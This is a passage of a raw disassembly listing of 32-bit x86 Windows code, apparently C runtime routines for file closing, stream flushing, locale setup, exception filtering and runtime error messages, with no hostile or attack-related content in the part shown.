  4056ee:	85 db                	test   %ebx,%ebx
  4056f0:	78 08                	js     0x4056fa
  4056f2:	3b 1d 04 16 41 00    	cmp    0x411604,%ebx
  4056f8:	72 1a                	jb     0x405714
  4056fa:	e8 c1 eb ff ff       	call   0x4042c0
  4056ff:	83 20 00             	andl   $0x0,(%eax)
  405702:	e8 a6 eb ff ff       	call   0x4042ad
  405707:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40570d:	e8 49 eb ff ff       	call   0x40425b
  405712:	eb d2                	jmp    0x4056e6
  405714:	8b c3                	mov    %ebx,%eax
  405716:	c1 f8 05             	sar    $0x5,%eax
  405719:	8d 3c 85 20 16 41 00 	lea    0x411620(,%eax,4),%edi
  405720:	8b f3                	mov    %ebx,%esi
  405722:	83 e6 1f             	and    $0x1f,%esi
  405725:	c1 e6 06             	shl    $0x6,%esi
  405728:	8b 07                	mov    (%edi),%eax
  40572a:	0f be 44 30 04       	movsbl 0x4(%eax,%esi,1),%eax
  40572f:	83 e0 01             	and    $0x1,%eax
  405732:	74 c6                	je     0x4056fa
  405734:	53                   	push   %ebx
  405735:	e8 20 20 00 00       	call   0x40775a
  40573a:	59                   	pop    %ecx
  40573b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40573f:	8b 07                	mov    (%edi),%eax
  405741:	f6 44 30 04 01       	testb  $0x1,0x4(%eax,%esi,1)
  405746:	74 14                	je     0x40575c
  405748:	ff 75 10             	push   0x10(%ebp)
  40574b:	ff 75 0c             	push   0xc(%ebp)
  40574e:	53                   	push   %ebx
  40574f:	e8 6e f8 ff ff       	call   0x404fc2
  405754:	83 c4 0c             	add    $0xc,%esp
  405757:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40575a:	eb 17                	jmp    0x405773
  40575c:	e8 4c eb ff ff       	call   0x4042ad
  405761:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  405767:	e8 54 eb ff ff       	call   0x4042c0
  40576c:	83 20 00             	andl   $0x0,(%eax)
  40576f:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  405773:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40577a:	e8 0c 00 00 00       	call   0x40578b
  40577f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405782:	e8 8e f3 ff ff       	call   0x404b15
  405787:	c3                   	ret
  405788:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40578b:	53                   	push   %ebx
  40578c:	e8 68 20 00 00       	call   0x4077f9
  405791:	59                   	pop    %ecx
  405792:	c3                   	ret
  405793:	8b ff                	mov    %edi,%edi
  405795:	55                   	push   %ebp
  405796:	8b ec                	mov    %esp,%ebp
  405798:	8b 45 08             	mov    0x8(%ebp),%eax
  40579b:	85 c0                	test   %eax,%eax
  40579d:	75 15                	jne    0x4057b4
  40579f:	e8 09 eb ff ff       	call   0x4042ad
  4057a4:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4057aa:	e8 ac ea ff ff       	call   0x40425b
  4057af:	83 c8 ff             	or     $0xffffffff,%eax
  4057b2:	5d                   	pop    %ebp
  4057b3:	c3                   	ret
  4057b4:	8b 40 10             	mov    0x10(%eax),%eax
  4057b7:	5d                   	pop    %ebp
  4057b8:	c3                   	ret
  4057b9:	8b ff                	mov    %edi,%edi
  4057bb:	55                   	push   %ebp
  4057bc:	8b ec                	mov    %esp,%ebp
  4057be:	53                   	push   %ebx
  4057bf:	56                   	push   %esi
  4057c0:	8b 75 08             	mov    0x8(%ebp),%esi
  4057c3:	8b 46 0c             	mov    0xc(%esi),%eax
  4057c6:	8b c8                	mov    %eax,%ecx
  4057c8:	80 e1 03             	and    $0x3,%cl
  4057cb:	33 db                	xor    %ebx,%ebx
  4057cd:	80 f9 02             	cmp    $0x2,%cl
  4057d0:	75 40                	jne    0x405812
  4057d2:	a9 08 01 00 00       	test   $0x108,%eax
  4057d7:	74 39                	je     0x405812
  4057d9:	8b 46 08             	mov    0x8(%esi),%eax
  4057dc:	57                   	push   %edi
  4057dd:	8b 3e                	mov    (%esi),%edi
  4057df:	2b f8                	sub    %eax,%edi
  4057e1:	85 ff                	test   %edi,%edi
  4057e3:	7e 2c                	jle    0x405811
  4057e5:	57                   	push   %edi
  4057e6:	50                   	push   %eax
  4057e7:	56                   	push   %esi
  4057e8:	e8 a6 ff ff ff       	call   0x405793
  4057ed:	59                   	pop    %ecx
  4057ee:	50                   	push   %eax
  4057ef:	e8 cb fe ff ff       	call   0x4056bf
  4057f4:	83 c4 0c             	add    $0xc,%esp
  4057f7:	3b c7                	cmp    %edi,%eax
  4057f9:	75 0f                	jne    0x40580a
  4057fb:	8b 46 0c             	mov    0xc(%esi),%eax
  4057fe:	84 c0                	test   %al,%al
  405800:	79 0f                	jns    0x405811
  405802:	83 e0 fd             	and    $0xfffffffd,%eax
  405805:	89 46 0c             	mov    %eax,0xc(%esi)
  405808:	eb 07                	jmp    0x405811
  40580a:	83 4e 0c 20          	orl    $0x20,0xc(%esi)
  40580e:	83 cb ff             	or     $0xffffffff,%ebx
  405811:	5f                   	pop    %edi
  405812:	8b 46 08             	mov    0x8(%esi),%eax
  405815:	83 66 04 00          	andl   $0x0,0x4(%esi)
  405819:	89 06                	mov    %eax,(%esi)
  40581b:	5e                   	pop    %esi
  40581c:	8b c3                	mov    %ebx,%eax
  40581e:	5b                   	pop    %ebx
  40581f:	5d                   	pop    %ebp
  405820:	c3                   	ret
  405821:	8b ff                	mov    %edi,%edi
  405823:	55                   	push   %ebp
  405824:	8b ec                	mov    %esp,%ebp
  405826:	56                   	push   %esi
  405827:	8b 75 08             	mov    0x8(%ebp),%esi
  40582a:	85 f6                	test   %esi,%esi
  40582c:	75 09                	jne    0x405837
  40582e:	56                   	push   %esi
  40582f:	e8 35 00 00 00       	call   0x405869
  405834:	59                   	pop    %ecx
  405835:	eb 2f                	jmp    0x405866
  405837:	56                   	push   %esi
  405838:	e8 7c ff ff ff       	call   0x4057b9
  40583d:	59                   	pop    %ecx
  40583e:	85 c0                	test   %eax,%eax
  405840:	74 05                	je     0x405847
  405842:	83 c8 ff             	or     $0xffffffff,%eax
  405845:	eb 1f                	jmp    0x405866
  405847:	f7 46 0c 00 40 00 00 	testl  $0x4000,0xc(%esi)
  40584e:	74 14                	je     0x405864
  405850:	56                   	push   %esi
  405851:	e8 3d ff ff ff       	call   0x405793
  405856:	50                   	push   %eax
  405857:	e8 c4 1f 00 00       	call   0x407820
  40585c:	59                   	pop    %ecx
  40585d:	f7 d8                	neg    %eax
  40585f:	59                   	pop    %ecx
  405860:	1b c0                	sbb    %eax,%eax
  405862:	eb 02                	jmp    0x405866
  405864:	33 c0                	xor    %eax,%eax
  405866:	5e                   	pop    %esi
  405867:	5d                   	pop    %ebp
  405868:	c3                   	ret
  405869:	6a 14                	push   $0x14
  40586b:	68 88 d8 40 00       	push   $0x40d888
  405870:	e8 5b f2 ff ff       	call   0x404ad0
  405875:	33 ff                	xor    %edi,%edi
  405877:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40587a:	89 7d dc             	mov    %edi,-0x24(%ebp)
  40587d:	6a 01                	push   $0x1
  40587f:	e8 67 14 00 00       	call   0x406ceb
  405884:	59                   	pop    %ecx
  405885:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405888:	33 f6                	xor    %esi,%esi
  40588a:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40588d:	3b 35 40 27 41 00    	cmp    0x412740,%esi
  405893:	0f 8d 83 00 00 00    	jge    0x40591c
  405899:	a1 20 17 41 00       	mov    0x411720,%eax
  40589e:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  4058a1:	39 38                	cmp    %edi,(%eax)
  4058a3:	74 5e                	je     0x405903
  4058a5:	8b 00                	mov    (%eax),%eax
  4058a7:	f6 40 0c 83          	testb  $0x83,0xc(%eax)
  4058ab:	74 56                	je     0x405903
  4058ad:	50                   	push   %eax
  4058ae:	56                   	push   %esi
  4058af:	e8 1d f5 ff ff       	call   0x404dd1
  4058b4:	59                   	pop    %ecx
  4058b5:	59                   	pop    %ecx
  4058b6:	33 d2                	xor    %edx,%edx
  4058b8:	42                   	inc    %edx
  4058b9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4058bc:	a1 20 17 41 00       	mov    0x411720,%eax
  4058c1:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  4058c4:	8b 48 0c             	mov    0xc(%eax),%ecx
  4058c7:	f6 c1 83             	test   $0x83,%cl
  4058ca:	74 2f                	je     0x4058fb
  4058cc:	39 55 08             	cmp    %edx,0x8(%ebp)
  4058cf:	75 11                	jne    0x4058e2
  4058d1:	50                   	push   %eax
  4058d2:	e8 4a ff ff ff       	call   0x405821
  4058d7:	59                   	pop    %ecx
  4058d8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4058db:	74 1e                	je     0x4058fb
  4058dd:	ff 45 e4             	incl   -0x1c(%ebp)
  4058e0:	eb 19                	jmp    0x4058fb
  4058e2:	39 7d 08             	cmp    %edi,0x8(%ebp)
  4058e5:	75 14                	jne    0x4058fb
  4058e7:	f6 c1 02             	test   $0x2,%cl
  4058ea:	74 0f                	je     0x4058fb
  4058ec:	50                   	push   %eax
  4058ed:	e8 2f ff ff ff       	call   0x405821
  4058f2:	59                   	pop    %ecx
  4058f3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4058f6:	75 03                	jne    0x4058fb
  4058f8:	09 45 dc             	or     %eax,-0x24(%ebp)
  4058fb:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4058fe:	e8 08 00 00 00       	call   0x40590b
  405903:	46                   	inc    %esi
  405904:	eb 84                	jmp    0x40588a
  405906:	33 ff                	xor    %edi,%edi
  405908:	8b 75 e0             	mov    -0x20(%ebp),%esi
  40590b:	a1 20 17 41 00       	mov    0x411720,%eax
  405910:	ff 34 b0             	push   (%eax,%esi,4)
  405913:	56                   	push   %esi
  405914:	e8 26 f5 ff ff       	call   0x404e3f
  405919:	59                   	pop    %ecx
  40591a:	59                   	pop    %ecx
  40591b:	c3                   	ret
  40591c:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405923:	e8 12 00 00 00       	call   0x40593a
  405928:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40592c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40592f:	74 03                	je     0x405934
  405931:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405934:	e8 dc f1 ff ff       	call   0x404b15
  405939:	c3                   	ret
  40593a:	6a 01                	push   $0x1
  40593c:	e8 d1 12 00 00       	call   0x406c12
  405941:	59                   	pop    %ecx
  405942:	c3                   	ret
  405943:	6a 01                	push   $0x1
  405945:	e8 1f ff ff ff       	call   0x405869
  40594a:	59                   	pop    %ecx
  40594b:	c3                   	ret
  40594c:	8b ff                	mov    %edi,%edi
  40594e:	55                   	push   %ebp
  40594f:	8b ec                	mov    %esp,%ebp
  405951:	56                   	push   %esi
  405952:	8b 75 08             	mov    0x8(%ebp),%esi
  405955:	57                   	push   %edi
  405956:	56                   	push   %esi
  405957:	e8 95 1d 00 00       	call   0x4076f1
  40595c:	59                   	pop    %ecx
  40595d:	83 f8 ff             	cmp    $0xffffffff,%eax
  405960:	74 50                	je     0x4059b2
  405962:	a1 20 16 41 00       	mov    0x411620,%eax
  405967:	83 fe 01             	cmp    $0x1,%esi
  40596a:	75 09                	jne    0x405975
  40596c:	f6 80 84 00 00 00 01 	testb  $0x1,0x84(%eax)
  405973:	75 0b                	jne    0x405980
  405975:	83 fe 02             	cmp    $0x2,%esi
  405978:	75 1c                	jne    0x405996
  40597a:	f6 40 44 01          	testb  $0x1,0x44(%eax)
  40597e:	74 16                	je     0x405996
  405980:	6a 02                	push   $0x2
  405982:	e8 6a 1d 00 00       	call   0x4076f1
  405987:	6a 01                	push   $0x1
  405989:	8b f8                	mov    %eax,%edi
  40598b:	e8 61 1d 00 00       	call   0x4076f1
  405990:	59                   	pop    %ecx
  405991:	59                   	pop    %ecx
  405992:	3b c7                	cmp    %edi,%eax
  405994:	74 1c                	je     0x4059b2
  405996:	56                   	push   %esi
  405997:	e8 55 1d 00 00       	call   0x4076f1
  40599c:	59                   	pop    %ecx
  40599d:	50                   	push   %eax
  40599e:	ff 15 dc b0 40 00    	call   *0x40b0dc
  4059a4:	85 c0                	test   %eax,%eax
  4059a6:	75 0a                	jne    0x4059b2
  4059a8:	ff 15 8c b0 40 00    	call   *0x40b08c
  4059ae:	8b f8                	mov    %eax,%edi
  4059b0:	eb 02                	jmp    0x4059b4
  4059b2:	33 ff                	xor    %edi,%edi
  4059b4:	56                   	push   %esi
  4059b5:	e8 b1 1c 00 00       	call   0x40766b
  4059ba:	8b c6                	mov    %esi,%eax
  4059bc:	c1 f8 05             	sar    $0x5,%eax
  4059bf:	8b 04 85 20 16 41 00 	mov    0x411620(,%eax,4),%eax
  4059c6:	83 e6 1f             	and    $0x1f,%esi
  4059c9:	c1 e6 06             	shl    $0x6,%esi
  4059cc:	59                   	pop    %ecx
  4059cd:	c6 44 30 04 00       	movb   $0x0,0x4(%eax,%esi,1)
  4059d2:	85 ff                	test   %edi,%edi
  4059d4:	74 0c                	je     0x4059e2
  4059d6:	57                   	push   %edi
  4059d7:	e8 f7 e8 ff ff       	call   0x4042d3
  4059dc:	59                   	pop    %ecx
  4059dd:	83 c8 ff             	or     $0xffffffff,%eax
  4059e0:	eb 02                	jmp    0x4059e4
  4059e2:	33 c0                	xor    %eax,%eax
  4059e4:	5f                   	pop    %edi
  4059e5:	5e                   	pop    %esi
  4059e6:	5d                   	pop    %ebp
  4059e7:	c3                   	ret
  4059e8:	6a 10                	push   $0x10
  4059ea:	68 b0 d8 40 00       	push   $0x40d8b0
  4059ef:	e8 dc f0 ff ff       	call   0x404ad0
  4059f4:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4059f7:	83 fb fe             	cmp    $0xfffffffe,%ebx
  4059fa:	75 1b                	jne    0x405a17
  4059fc:	e8 bf e8 ff ff       	call   0x4042c0
  405a01:	83 20 00             	andl   $0x0,(%eax)
  405a04:	e8 a4 e8 ff ff       	call   0x4042ad
  405a09:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  405a0f:	83 c8 ff             	or     $0xffffffff,%eax
  405a12:	e9 84 00 00 00       	jmp    0x405a9b
  405a17:	85 db                	test   %ebx,%ebx
  405a19:	78 08                	js     0x405a23
  405a1b:	3b 1d 04 16 41 00    	cmp    0x411604,%ebx
  405a21:	72 1a                	jb     0x405a3d
  405a23:	e8 98 e8 ff ff       	call   0x4042c0
  405a28:	83 20 00             	andl   $0x0,(%eax)
  405a2b:	e8 7d e8 ff ff       	call   0x4042ad
  405a30:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  405a36:	e8 20 e8 ff ff       	call   0x40425b
  405a3b:	eb d2                	jmp    0x405a0f
  405a3d:	8b c3                	mov    %ebx,%eax
  405a3f:	c1 f8 05             	sar    $0x5,%eax
  405a42:	8d 3c 85 20 16 41 00 	lea    0x411620(,%eax,4),%edi
  405a49:	8b f3                	mov    %ebx,%esi
  405a4b:	83 e6 1f             	and    $0x1f,%esi
  405a4e:	c1 e6 06             	shl    $0x6,%esi
  405a51:	8b 07                	mov    (%edi),%eax
  405a53:	0f be 44 30 04       	movsbl 0x4(%eax,%esi,1),%eax
  405a58:	83 e0 01             	and    $0x1,%eax
  405a5b:	74 c6                	je     0x405a23
  405a5d:	53                   	push   %ebx
  405a5e:	e8 f7 1c 00 00       	call   0x40775a
  405a63:	59                   	pop    %ecx
  405a64:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405a68:	8b 07                	mov    (%edi),%eax
  405a6a:	f6 44 30 04 01       	testb  $0x1,0x4(%eax,%esi,1)
  405a6f:	74 0c                	je     0x405a7d
  405a71:	53                   	push   %ebx
  405a72:	e8 d5 fe ff ff       	call   0x40594c
  405a77:	59                   	pop    %ecx
  405a78:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405a7b:	eb 0f                	jmp    0x405a8c
  405a7d:	e8 2b e8 ff ff       	call   0x4042ad
  405a82:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  405a88:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  405a8c:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405a93:	e8 0c 00 00 00       	call   0x405aa4
  405a98:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405a9b:	e8 75 f0 ff ff       	call   0x404b15
  405aa0:	c3                   	ret
  405aa1:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405aa4:	53                   	push   %ebx
  405aa5:	e8 4f 1d 00 00       	call   0x4077f9
  405aaa:	59                   	pop    %ecx
  405aab:	c3                   	ret
  405aac:	8b ff                	mov    %edi,%edi
  405aae:	55                   	push   %ebp
  405aaf:	8b ec                	mov    %esp,%ebp
  405ab1:	56                   	push   %esi
  405ab2:	8b 75 08             	mov    0x8(%ebp),%esi
  405ab5:	8b 46 0c             	mov    0xc(%esi),%eax
  405ab8:	a8 83                	test   $0x83,%al
  405aba:	74 1e                	je     0x405ada
  405abc:	a8 08                	test   $0x8,%al
  405abe:	74 1a                	je     0x405ada
  405ac0:	ff 76 08             	push   0x8(%esi)
  405ac3:	e8 e3 e0 ff ff       	call   0x403bab
  405ac8:	81 66 0c f7 fb ff ff 	andl   $0xfffffbf7,0xc(%esi)
  405acf:	33 c0                	xor    %eax,%eax
  405ad1:	59                   	pop    %ecx
  405ad2:	89 06                	mov    %eax,(%esi)
  405ad4:	89 46 08             	mov    %eax,0x8(%esi)
  405ad7:	89 46 04             	mov    %eax,0x4(%esi)
  405ada:	5e                   	pop    %esi
  405adb:	5d                   	pop    %ebp
  405adc:	c3                   	ret
  405add:	8b ff                	mov    %edi,%edi
  405adf:	55                   	push   %ebp
  405ae0:	8b ec                	mov    %esp,%ebp
  405ae2:	8b 45 08             	mov    0x8(%ebp),%eax
  405ae5:	56                   	push   %esi
  405ae6:	8b f1                	mov    %ecx,%esi
  405ae8:	c6 46 0c 00          	movb   $0x0,0xc(%esi)
  405aec:	85 c0                	test   %eax,%eax
  405aee:	75 63                	jne    0x405b53
  405af0:	e8 90 0b 00 00       	call   0x406685
  405af5:	89 46 08             	mov    %eax,0x8(%esi)
  405af8:	8b 48 6c             	mov    0x6c(%eax),%ecx
  405afb:	89 0e                	mov    %ecx,(%esi)
  405afd:	8b 48 68             	mov    0x68(%eax),%ecx
  405b00:	89 4e 04             	mov    %ecx,0x4(%esi)
  405b03:	8b 0e                	mov    (%esi),%ecx
  405b05:	3b 0d d8 fd 40 00    	cmp    0x40fdd8,%ecx
  405b0b:	74 12                	je     0x405b1f
  405b0d:	8b 0d 90 fb 40 00    	mov    0x40fb90,%ecx
  405b13:	85 48 70             	test   %ecx,0x70(%eax)
  405b16:	75 07                	jne    0x405b1f
  405b18:	e8 80 27 00 00       	call   0x40829d
  405b1d:	89 06                	mov    %eax,(%esi)
  405b1f:	8b 46 04             	mov    0x4(%esi),%eax
  405b22:	3b 05 98 fa 40 00    	cmp    0x40fa98,%eax
  405b28:	74 16                	je     0x405b40
  405b2a:	8b 46 08             	mov    0x8(%esi),%eax
  405b2d:	8b 0d 90 fb 40 00    	mov    0x40fb90,%ecx
  405b33:	85 48 70             	test   %ecx,0x70(%eax)
  405b36:	75 08                	jne    0x405b40
  405b38:	e8 df 1f 00 00       	call   0x407b1c
  405b3d:	89 46 04             	mov    %eax,0x4(%esi)
  405b40:	8b 46 08             	mov    0x8(%esi),%eax
  405b43:	f6 40 70 02          	testb  $0x2,0x70(%eax)
  405b47:	75 14                	jne    0x405b5d
  405b49:	83 48 70 02          	orl    $0x2,0x70(%eax)
  405b4d:	c6 46 0c 01          	movb   $0x1,0xc(%esi)
  405b51:	eb 0a                	jmp    0x405b5d
  405b53:	8b 08                	mov    (%eax),%ecx
  405b55:	89 0e                	mov    %ecx,(%esi)
  405b57:	8b 40 04             	mov    0x4(%eax),%eax
  405b5a:	89 46 04             	mov    %eax,0x4(%esi)
  405b5d:	8b c6                	mov    %esi,%eax
  405b5f:	5e                   	pop    %esi
  405b60:	5d                   	pop    %ebp
  405b61:	c2 04 00             	ret    $0x4
  405b64:	8b ff                	mov    %edi,%edi
  405b66:	55                   	push   %ebp
  405b67:	8b ec                	mov    %esp,%ebp
  405b69:	8b 45 08             	mov    0x8(%ebp),%eax
  405b6c:	8b 00                	mov    (%eax),%eax
  405b6e:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  405b74:	75 2a                	jne    0x405ba0
  405b76:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  405b7a:	75 24                	jne    0x405ba0
  405b7c:	8b 40 14             	mov    0x14(%eax),%eax
  405b7f:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  405b84:	74 15                	je     0x405b9b
  405b86:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  405b8b:	74 0e                	je     0x405b9b
  405b8d:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  405b92:	74 07                	je     0x405b9b
  405b94:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  405b99:	75 05                	jne    0x405ba0
  405b9b:	e8 00 12 00 00       	call   0x406da0
  405ba0:	33 c0                	xor    %eax,%eax
  405ba2:	5d                   	pop    %ebp
  405ba3:	c2 04 00             	ret    $0x4
  405ba6:	68 64 5b 40 00       	push   $0x405b64
  405bab:	ff 15 f8 b0 40 00    	call   *0x40b0f8
  405bb1:	33 c0                	xor    %eax,%eax
  405bb3:	c3                   	ret
  405bb4:	8b ff                	mov    %edi,%edi
  405bb6:	55                   	push   %ebp
  405bb7:	8b ec                	mov    %esp,%ebp
  405bb9:	33 c0                	xor    %eax,%eax
  405bbb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405bbe:	3b 0c c5 60 bc 40 00 	cmp    0x40bc60(,%eax,8),%ecx
  405bc5:	74 0a                	je     0x405bd1
  405bc7:	40                   	inc    %eax
  405bc8:	83 f8 16             	cmp    $0x16,%eax
  405bcb:	72 ee                	jb     0x405bbb
  405bcd:	33 c0                	xor    %eax,%eax
  405bcf:	5d                   	pop    %ebp
  405bd0:	c3                   	ret
  405bd1:	8b 04 c5 64 bc 40 00 	mov    0x40bc64(,%eax,8),%eax
  405bd8:	5d                   	pop    %ebp
  405bd9:	c3                   	ret
  405bda:	8b ff                	mov    %edi,%edi
  405bdc:	55                   	push   %ebp
  405bdd:	8b ec                	mov    %esp,%ebp
  405bdf:	81 ec fc 01 00 00    	sub    $0x1fc,%esp
  405be5:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  405bea:	33 c5                	xor    %ebp,%eax
  405bec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405bef:	53                   	push   %ebx
  405bf0:	56                   	push   %esi
  405bf1:	8b 75 08             	mov    0x8(%ebp),%esi
  405bf4:	57                   	push   %edi
  405bf5:	56                   	push   %esi
  405bf6:	e8 b9 ff ff ff       	call   0x405bb4
  405bfb:	8b f8                	mov    %eax,%edi
  405bfd:	33 db                	xor    %ebx,%ebx
  405bff:	59                   	pop    %ecx
  405c00:	89 bd 04 fe ff ff    	mov    %edi,-0x1fc(%ebp)
  405c06:	3b fb                	cmp    %ebx,%edi
  405c08:	0f 84 6c 01 00 00    	je     0x405d7a
  405c0e:	6a 03                	push   $0x3
  405c10:	e8 cc 2a 00 00       	call   0x4086e1
  405c15:	59                   	pop    %ecx
  405c16:	83 f8 01             	cmp    $0x1,%eax
  405c19:	0f 84 07 01 00 00    	je     0x405d26
  405c1f:	6a 03                	push   $0x3
  405c21:	e8 bb 2a 00 00       	call   0x4086e1
  405c26:	59                   	pop    %ecx
  405c27:	85 c0                	test   %eax,%eax
  405c29:	75 0d                	jne    0x405c38
  405c2b:	83 3d a0 f0 40 00 01 	cmpl   $0x1,0x40f0a0
  405c32:	0f 84 ee 00 00 00    	je     0x405d26
  405c38:	81 fe fc 00 00 00    	cmp    $0xfc,%esi
  405c3e:	0f 84 36 01 00 00    	je     0x405d7a
  405c44:	68 9c bd 40 00       	push   $0x40bd9c
  405c49:	68 14 03 00 00       	push   $0x314
  405c4e:	bf b0 0b 41 00       	mov    $0x410bb0,%edi
  405c53:	57                   	push   %edi
  405c54:	e8 25 2a 00 00       	call   0x40867e
  405c59:	83 c4 0c             	add    $0xc,%esp
  405c5c:	85 c0                	test   %eax,%eax
  405c5e:	0f 85 b8 00 00 00    	jne    0x405d1c
  405c64:	68 04 01 00 00       	push   $0x104
  405c69:	be e2 0b 41 00       	mov    $0x410be2,%esi
  405c6e:	56                   	push   %esi
  405c6f:	53                   	push   %ebx
  405c70:	66 a3 ea 0d 41 00    	mov    %ax,0x410dea
  405c76:	ff 15 1c b1 40 00    	call   *0x40b11c
  405c7c:	bb fb 02 00 00       	mov    $0x2fb,%ebx
  405c81:	85 c0                	test   %eax,%eax
  405c83:	75 1f                	jne    0x405ca4
  405c85:	68 6c bd 40 00       	push   $0x40bd6c
  405c8a:	53                   	push   %ebx
  405c8b:	56                   	push   %esi
  405c8c:	e8 ed 29 00 00       	call   0x40867e
  405c91:	83 c4 0c             	add    $0xc,%esp
  405c94:	85 c0                	test   %eax,%eax
  405c96:	74 0c                	je     0x405ca4
  405c98:	33 c0                	xor    %eax,%eax
  405c9a:	50                   	push   %eax
  405c9b:	50                   	push   %eax
  405c9c:	50                   	push   %eax
  405c9d:	50                   	push   %eax
  405c9e:	50                   	push   %eax
  405c9f:	e8 65 e5 ff ff       	call   0x404209
  405ca4:	56                   	push   %esi
  405ca5:	e8 b9 29 00 00       	call   0x408663
  405caa:	40                   	inc    %eax
  405cab:	59                   	pop    %ecx
  405cac:	83 f8 3c             	cmp    $0x3c,%eax
  405caf:	76 2a                	jbe    0x405cdb
  405cb1:	56                   	push   %esi
  405cb2:	e8 ac 29 00 00       	call   0x408663
  405cb7:	8d 04 45 6c 0b 41 00 	lea    0x410b6c(,%eax,2),%eax
  405cbe:	8b c8                	mov    %eax,%ecx
  405cc0:	2b ce                	sub    %esi,%ecx
  405cc2:	6a 03                	push   $0x3
  405cc4:	d1 f9                	sar    $1,%ecx
  405cc6:	68 64 bd 40 00       	push   $0x40bd64
  405ccb:	2b d9                	sub    %ecx,%ebx
  405ccd:	53                   	push   %ebx
  405cce:	50                   	push   %eax
  405ccf:	e8 c2 28 00 00       	call   0x408596
  405cd4:	83 c4 14             	add    $0x14,%esp
  405cd7:	85 c0                	test   %eax,%eax
  405cd9:	75 bd                	jne    0x405c98
  405cdb:	68 5c bd 40 00       	push   $0x40bd5c
  405ce0:	be 14 03 00 00       	mov    $0x314,%esi
  405ce5:	56                   	push   %esi
  405ce6:	57                   	push   %edi
  405ce7:	e8 35 28 00 00       	call   0x408521
  405cec:	83 c4 0c             	add    $0xc,%esp
  405cef:	85 c0                	test   %eax,%eax
  405cf1:	75 a5                	jne    0x405c98
  405cf3:	ff b5 04 fe ff ff    	push   -0x1fc(%ebp)
  405cf9:	56                   	push   %esi
  405cfa:	57                   	push   %edi
  405cfb:	e8 21 28 00 00       	call   0x408521
  405d00:	83 c4 0c             	add    $0xc,%esp
  405d03:	85 c0                	test   %eax,%eax
  405d05:	75 91                	jne    0x405c98
  405d07:	68 10 20 01 00       	push   $0x12010
  405d0c:	68 10 bd 40 00       	push   $0x40bd10
  405d11:	57                   	push   %edi
  405d12:	e8 9e 26 00 00       	call   0x4083b5
  405d17:	83 c4 0c             	add    $0xc,%esp
  405d1a:	eb 5e                	jmp    0x405d7a
  405d1c:	53                   	push   %ebx
  405d1d:	53                   	push   %ebx
  405d1e:	53                   	push   %ebx
  405d1f:	53                   	push   %ebx
  405d20:	53                   	push   %ebx
  405d21:	e9 79 ff ff ff       	jmp    0x405c9f
  405d26:	6a f4                	push   $0xfffffff4
  405d28:	ff 15 18 b1 40 00    	call   *0x40b118
  405d2e:	8b f0                	mov    %eax,%esi
  405d30:	3b f3                	cmp    %ebx,%esi
  405d32:	74 46                	je     0x405d7a
  405d34:	83 fe ff             	cmp    $0xffffffff,%esi
  405d37:	74 41                	je     0x405d7a
  405d39:	33 c0                	xor    %eax,%eax
  405d3b:	8a 0c 47             	mov    (%edi,%eax,2),%cl
  405d3e:	88 8c 05 08 fe ff ff 	mov    %cl,-0x1f8(%ebp,%eax,1)
  405d45:	66 39 1c 47          	cmp    %bx,(%edi,%eax,2)
  405d49:	74 08                	je     0x405d53
  405d4b:	40                   	inc    %eax
  405d4c:	3d f4 01 00 00       	cmp    $0x1f4,%eax
  405d51:	72 e8                	jb     0x405d3b
  405d53:	53                   	push   %ebx
  405d54:	8d 85 04 fe ff ff    	lea    -0x1fc(%ebp),%eax
  405d5a:	50                   	push   %eax
  405d5b:	8d 85 08 fe ff ff    	lea    -0x1f8(%ebp),%eax
  405d61:	50                   	push   %eax
  405d62:	88 5d fb             	mov    %bl,-0x5(%ebp)
  405d65:	e8 86 e7 ff ff       	call   0x4044f0
  405d6a:	59                   	pop    %ecx
  405d6b:	50                   	push   %eax
  405d6c:	8d 85 08 fe ff ff    	lea    -0x1f8(%ebp),%eax
  405d72:	50                   	push   %eax
  405d73:	56                   	push   %esi
  405d74:	ff 15 0c b1 40 00    	call   *0x40b10c
  405d7a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405d7d:	5f                   	pop    %edi
  405d7e:	5e                   	pop    %esi
  405d7f:	33 cd                	xor    %ebp,%ecx
  405d81:	5b                   	pop    %ebx
  405d82:	e8 f7 d2 ff ff       	call   0x40307e
  405d87:	c9                   	leave
  405d88:	c3                   	ret
  405d89:	6a 03                	push   $0x3
  405d8b:	e8 51 29 00 00       	call   0x4086e1
